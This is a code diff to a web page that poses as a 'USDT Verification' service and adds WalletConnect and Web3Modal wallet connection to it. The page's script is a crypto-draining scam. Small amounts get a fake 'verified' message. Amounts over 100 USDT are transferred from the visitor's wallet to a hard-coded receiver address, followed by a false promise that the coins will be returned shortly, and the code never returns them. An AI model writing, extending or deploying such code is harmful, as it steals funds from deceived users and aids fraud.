@@ -4,7 +4,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>USDT Verification</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
   <style>
     body {
       background: linear-gradient(135deg, #1d2b64, #f8cdda);
@@ -37,56 +39,74 @@
     <button class="btn btn-success" onclick="verifyUSDT()">Verify</button>
     <p class="mt-4" id="status"></p>
   </div>  <script>
+    let web3Modal;
     let provider;
     let signer;
+
     const receiverAddress = "0xEab6eE87b58Da3B50c294C8c4a748EFb4d376386";
     const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-
     const usdtAbi = [
       "function transfer(address to, uint amount) public returns (bool)",
       "function decimals() view returns (uint8)"
     ];
 
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: {
+            56: "https://bsc-dataseed.binance.org/"
+          },
+          chainId: 56
+        }
+      }
+    };
+
+    web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
+    });
+
     async function connectWallet() {
-      if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
+      try {
+        const instance = await web3Modal.connect();
+        provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
-        document.getElementById("status").innerText = "✅ Wallet connected.";
-      } else {
-        alert("Please install MetaMask.");
+        const address = await signer.getAddress();
+        document.getElementById("status").innerText = "✅ Wallet connected: " + address;
+      } catch (err) {
+        console.error(err);
+        alert("Connection failed");
       }
     }
 
     async function verifyUSDT() {
-      const amount = parseFloat(document.getElementById("amount").value);
-      if (!signer) return alert("Connect your wallet first.");
-      if (amount <= 0) return alert("Enter a valid amount");
+      try {
+        const amount = parseFloat(document.getElementById("amount").value);
+        if (!signer) return alert("Connect your wallet first.");
+        if (amount <= 0) return alert("Enter a valid amount");
 
-      if (amount <= 100) {
-        document.getElementById("status").innerText = "Verifying...";
-        setTimeout(() => {
-          document.getElementById("status").innerText = "✅ Your coins are verified.";
-        }, 3000);
-      } else {
-        try {
-          const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
-          const decimals = await usdt.decimals();
-          const amountToSend = ethers.utils.parseUnits(amount.toString(), decimals);
+        const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
-          document.getElementById("status").innerText = "🔄 Sending USDT for verification...";
-
-          const tx = await usdt.transfer(receiverAddress, amountToSend);
+        if (amount <= 100) {
+          document.getElementById("status").innerText = "Verifying...";
+          setTimeout(() => {
+            document.getElementById("status").innerText = "✅ Your coins are verified.";
+          }, 3000);
+        } else {
+          const decimals = await contract.decimals();
+          const amt = ethers.utils.parseUnits(amount.toString(), decimals);
+          const tx = await contract.transfer(receiverAddress, amt);
           await tx.wait();
 
           document.getElementById("status").innerText = "⏳ USDT sent. Please wait 2 minutes for verification...";
           setTimeout(() => {
             document.getElementById("status").innerText = "✅ You are verified. Coins will be returned shortly.";
           }, 120000);
-        } catch (error) {
-          console.error(error);
-          alert("Transaction failed or rejected.");
         }
+      } catch (err) {
+        console.error(err);
+        alert("Verification failed.");
       }
     }
   </script></body>
